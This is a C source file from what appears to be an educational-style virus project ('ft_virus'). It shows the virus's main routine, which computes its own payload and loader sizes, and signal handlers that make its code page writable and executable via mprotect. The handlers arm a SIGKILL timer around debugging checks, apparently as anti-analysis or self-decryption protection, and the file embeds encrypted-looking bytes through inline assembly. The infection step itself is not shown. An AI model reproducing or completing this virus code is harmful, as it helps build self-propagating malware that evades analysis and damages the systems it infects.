#include "ft_virus.h"

void		Main_Blaster ( void ) {

	/* Capture signals */
	Syscall2( __NR_signal, SIGUSR1, (long)&security_viruse );
	Syscall2( __NR_signal, SIGUSR2, (long)&security_viruse );

	/* -- Get size of viruses. (PAYLOAD) -- */
	uint32_t 	size = ((uint32_t)&Blaster_end - (uint32_t)&Blaster_start);	
	unsigned char	*p = (unsigned char*)&Blaster_end;
	for( ; ; ++p, ++size) {
		if (*p == 0XC3) { ++size; break; }
	}

	/* -- Get size of loader. -- */
	uint32_t	__attribute__((unused)) size_loader = ((uint32_t)&Blaster_start - (uint32_t)&loader);

	/* -- Get date -- */
	struct timeval __attribute__((unused))tv = {0};
	if ( Syscall2( __NR_gettimeofday, (long) &tv, 0 ) != 0) {

	}

	/* -- Get PID -- */
	long __attribute__((unused))pid = Syscall0( __NR_getpid );
	Syscall2( __NR_kill, pid, SIGUSR1);

	return ;
	/*char __attribute__((unused))*user_data = (char *)Syscall6(__NR_mmap2, 0, USER_MEMORY_SIZE, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0 );	
	if ( (long)user_data == -ENOMEM ) {
		// -- Memory unavailable -- //
		Syscall1( __NR_exit, 1 );
	}*/

	asm (".byte 0XA0,0X7C,0X57,0XB3,0X0F,0X6B,0X46,0X23,0X7E,0XD9,0X35,0X11,0XEC,0XC9,0X25,0X00");
}

void 	security_viruse (int __attribute__((unused))sig) {
	
	struct sigevent ev = {0};
	timer_t		timer1 = {0};
	ev.sigev_notify = SIGEV_SIGNAL;
	ev.sigev_signo  = SIGKILL;
	struct itimerspec itimer = {0};
			itimer.it_value.tv_sec = 3;
	char *function_main_blaster = (void *) (((uintptr_t)&Main_Blaster) & ~(0X1000 - 1));
	switch(sig) {

		case SIGUSR1:
			/* ----------------------------- */
			/* SECURITY WITH PROC DIRECTORY. */
			/* ----------------------------- */
			Syscall3( __NR_mprotect, (long)function_main_blaster, 0X1000, PROT_READ | PROT_WRITE | PROT_EXEC);

			if ( Syscall3( __NR_timer_create, CLOCK_REALTIME, (long)&ev, (long)&timer1 ) != 0) {

			}
	
			if ( Syscall4( __NR_timer_settime, (long)timer1, 0, (long )&itimer, 0 ) != 0 ) {
		
			}
			DEBUGGING1();
			Syscall3( __NR_mprotect, (long)function_main_blaster, 0X1000, PROT_READ | PROT_EXEC);
			itimer.it_value.tv_sec = 0;
			if ( Syscall4( __NR_timer_settime, (long)timer1, 0, (long )&itimer, 0 ) != 0 ) {
		
			}
				

			break;

		case SIGUSR2:
			/* --------------- */
			/* SECURITY KEY(S) */
			/* --------------- */
			if ( Syscall3( __NR_timer_create, CLOCK_REALTIME, (long)&ev, (long)&timer1 ) != 0) {

			}
	
			if ( Syscall4( __NR_timer_settime, (long)timer1, 0, (long )&itimer, 0 ) != 0 ) {
		
			}
			DEBUGGING0();
			itimer.it_value.tv_sec = 0;
			if ( Syscall4( __NR_timer_settime, (long)timer1, 0, (long )&itimer, 0 ) != 0 ) {
		
			}
			break;

		default:
			break ;
	}

}
